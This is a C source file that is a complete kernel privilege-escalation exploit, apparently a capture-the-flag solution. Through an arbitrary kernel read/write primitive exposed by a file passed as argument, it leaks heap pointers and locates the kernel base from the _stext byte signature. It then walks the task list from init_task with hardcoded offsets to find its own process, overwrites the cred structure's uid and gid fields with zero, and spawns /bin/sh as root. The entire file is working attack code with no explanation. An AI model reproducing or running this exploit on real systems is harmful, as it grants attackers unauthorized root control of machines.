#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>

char buf[4096];

int flag = 0;

void get_root(void) {
    while (!flag)
        usleep(10);

    if (getuid() != 0) 
        exit(1);
    
    execl("/bin/sh", "sh", NULL);
}

int main(int argc, char *argv[]) {

    char *fn = argv[1];
    int fd;

    if (argc != 2)
        return -1;

    fd = open(fn, O_RDWR);
    printf("[+] fd: %d\n", fd);

    unsigned int i, j;
    unsigned long p;
    unsigned long candidate[8];
    unsigned int cnt = 0;
    for (j = 0; j < 0x10000000 / 8; j++) {
        lseek(fd, 0x1000 + j * 8, SEEK_SET);
        read(fd, &p, 8);

        if ( 
            (p & 0xfffffffffff00000) != 0xfffffffffff00000
            && (p % 8 == 0)
            && (p % 0x1000 != 0)
            && ( // finding heap-pointer alike address
                (p & 0xfffff00000000000) == 0xffff800000000000
                || (p & 0xfffff00000000000) == 0xffff900000000000
                || (p & 0xfffff00000000000) == 0xffffa00000000000
            ) 
            ) {
            printf("[+] guess buffer address: 0x%08lx\n", p);
            candidate[cnt++] = p;  
            if (cnt == 8)
                break;
        }
    }

    unsigned long heap_base;
    unsigned long off;
    unsigned long kernel_base_offset = 0;

    for (i = 0; i < cnt; i++)
    {

        printf("[+] trying guessed buffer address: 0x%08lx\n", candidate[i]);

        // we believe that the highest 32 bytes of the found pointer on the heap
        // are the same of the ones of the file buffer base
        heap_base = candidate[i] & 0xffffffff00000000; 
        off = 0xffffffff00000000 - heap_base;

        unsigned char buf[16];

        for (j = 0; j < 0x100000000 / 0x1000; j++) {
            lseek(fd, off + 0x1000 * j, SEEK_SET); 
            read(fd, &buf, 16);

            if (buf[0] == 0x48 && buf[1] == 0x8d && buf[2] == 0x25
                && buf[7] == 0xe8 && buf[8] == 0xc3) {
                kernel_base_offset = off + 0x1000 * j;
                break;
            }

        }
        
        if (kernel_base_offset != 0)
            break;

    }

/*
ffffffff81000000 <_stext>:
ffffffff81000000:       48 8d 25 51 3f e0 00    lea    0xe03f51(%rip),%rsp        # ffffffff81e03f58 <__end_rodata_hpage_align+0x3f58>
ffffffff81000007:       e8 c3 00 00 00          callq  ffffffff810000cf <verify_cpu>
*/

   printf("kernel base offset: 0x%lx\n", kernel_base_offset);

    unsigned long sys_call_table_offset = 0xa001a0;
    unsigned long sys_read_offset = 0x243270;
    unsigned long sys_read;

    lseek(fd, kernel_base_offset + sys_call_table_offset, SEEK_SET);
    read(fd, &sys_read, 0x8);
    
    unsigned long kernel_base = sys_read - sys_read_offset;
    unsigned long buffer_base = kernel_base - kernel_base_offset;

    printf("buffer base: 0x%08lx\n", buffer_base);

    // we create some new threads
    // because early task_structs are allocated before the buffer
    // which cannot be reached
    pthread_t t;

    for (i = 0; i < 256; i++)
        pthread_create(&t, NULL, &get_root, NULL);

    char task_buf[0x2400];
    unsigned long cur;
    unsigned long init_task = kernel_base + 0xe10480;
    unsigned long cred;
    unsigned long real_cred;
  
    cur = init_task;

    while (1) {

        printf("[+] trying: 0x%08lx\n", cur);
        lseek(fd, cur - buffer_base, SEEK_SET);

        read(fd, task_buf, 0x2400);
        printf("[+] comm: %s\n", task_buf + 0x538);

        cred = *(unsigned long *)(task_buf + 0xb38);
        real_cred = *(unsigned long *)(task_buf + 0x1028);

        if (!strcmp(task_buf + 0x538, "exp") 
            && cred > buffer_base && real_cred > buffer_base) {
            printf("[+] FIND!\n");
            break;
        }

        // search from back (prev) 
        cur = *(unsigned long *)(task_buf + 0x10a8) - 0x10a0;
    }

    printf("[+] real cred: 0x%08lx\n", real_cred);
    printf("[+] cred: 0x%08lx\n", cred);

    char cred_buf[0xb0];
    lseek(fd, cred - buffer_base, SEEK_SET);
    read(fd, cred_buf, 0xb0);

    *(unsigned int *)(cred_buf + 0x8) = 0x0;  // uid
    *(unsigned int *)(cred_buf + 0x6c) = 0x0;  // gid
    *(unsigned int *)(cred_buf + 0x38) = 0x0;  // suid
    *(unsigned int *)(cred_buf + 0x20) = 0x0;  // sgid
    *(unsigned int *)(cred_buf + 0xa4) = 0x0;  // euid
    *(unsigned int *)(cred_buf + 0x68) = 0x0;  // egid

    lseek(fd, cred - buffer_base, SEEK_SET); 
    write(fd, cred_buf, 0xb0);

    flag = 1;
    
    if (getuid() != 0) {
        while (1)
            usleep(10);
    }

    execl("/bin/sh", "sh", NULL);
   
    close(fd);

    return 0;
}
